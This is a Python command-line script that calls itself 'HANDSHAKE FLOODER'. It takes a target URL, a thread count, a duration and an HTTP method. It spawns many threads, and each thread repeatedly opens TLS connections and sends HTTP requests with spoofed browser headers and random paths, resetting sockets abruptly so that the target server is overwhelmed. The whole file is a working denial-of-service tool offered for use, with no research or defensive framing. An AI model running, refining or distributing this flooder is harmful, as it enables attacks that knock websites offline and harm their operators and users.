import socket,ssl,struct,threading
from MODEL.data import get_target,generate_url_path

def connection_flood(ssl_socket,a,byt,target):
  for _ in range(250):
   try:
     for _ in range(250):
        ssl_socket.sendall(byt[0]); ssl_socket.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER,struct.pack('ii', 0, 1))
        ssl_socket.sendall(byt[1]); ssl_socket.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER,struct.pack('ii', 0, 1))
   except:
     adds = (target['host'], int(target['port']))
     ssl_socket = a.wrap_socket(socket.socket(socket.AF_INET, socket.SOCK_STREAM),server_hostname=target['host'])
     ssl_socket.connect(adds); ssl_socket.connect_ex(adds)

def create_connection(target,m,times):
 a = (target['host'], int(target['port']))
 try:
    path = 1
    for _ in range(times):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.setblocking(1); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1); s.setsockopt(socket.IPPROTO_IP, socket.IP_TTL, 255); s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1); s.setsockopt(socket.IPPROTO_TCP, socket.TCP_FASTOPEN, 1)
     s.connect(a); s.connect_ex(a)
     ssl_c = ssl.SSLContext()
     ssl_c.options = ssl.OP_NO_RENEGOTIATION
     threading.Thread(target=connection_flood,args=(ssl_c.wrap_socket(s,server_hostname=target['host']),ssl_c,[f"{m} {a} HTTP/1.1\r\nHost: {target['host']}\r\nCache-Control: no-cache\r\npragma: no-cache\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36 PTST/190628.140653\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nSec-Fetch-Site: same-origin\r\nSec-GPC: 1\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Dest: document\r\nUpgrade-Insecure-Requests: 1\r\nTe: trailers\r\nConnection: Keep-Alive\r\n\r\n".encode() for a in [f'/{generate_url_path(num=path)}',target['uri']]],target)).start()
     path += 1
 except:pass

import sys
url = ''
time_booter = 0
thread_lower = 0
METHODS = ''
if len(sys.argv) == 5:
   url = sys.argv[1]
   thread_lower = int(sys.argv[2])
   time_booter = int(sys.argv[3])
   METHODS = sys.argv[4]
else:
 print(f'WELCOME TO HANDSHAKE FLOODER\n{sys.argv[0]} <URL> <THREAD> <TIME> <METHODS>')
target = get_target(url)
for _ in range(int(thread_lower)):
   for _ in range(10):threading.Thread(target=create_connection,args=(target,METHODS,time_booter)).start()
